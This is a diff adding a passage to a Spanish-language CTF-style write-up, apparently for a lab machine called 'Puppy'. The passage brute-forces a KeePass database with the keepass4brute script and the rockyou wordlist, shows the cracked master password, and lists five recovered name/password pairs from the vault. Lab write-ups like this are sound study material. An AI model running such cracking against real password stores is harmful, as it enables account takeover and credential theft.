@@ -267,3 +267,24 @@ smb: \> ls
                 5080575 blocks of size 4096. 1639843 blocks available
 smb: \>
 ```
+Le haremos un ataque de fuerza bruta, peor no podremos hacerlo con keepass2john, ya que no soporta la versión, por lo tanto, descargaremos un script de github para realizarl el ataque de fuerza bruta llamado keepass4brute
+```bash
+└─# ./keepass4brute.sh DEV/recovery.kdbx /usr/share/wordlists/rockyou.txt 
+keepass4brute 1.3 by r3nt0n
+https://github.com/r3nt0n/keepass4brute
+
+[+] Words tested: 36/14344392 - Attempts per minute: 26 - Estimated time remaining: 54 weeks, 5 days
+[+] Current attempt: liverpool
+
+[*] Password found: liverpool
+                                                                                                                    
+┌──(root㉿kali)-[~/THM/Puppy]
+```
+Con wine podremos ejecutar el exe de keepass anteriormente extraido con msiextract
+```
+ADAM SILVER - HJKL2025!
+ANTONY C. EDWARDS - Antman2025!
+JAMIE WILLIAMSON - JamieLove2025!
+SAMUEL BLAKE - ILY2025!
+STEVE TUCKER - Steve2025!
+```
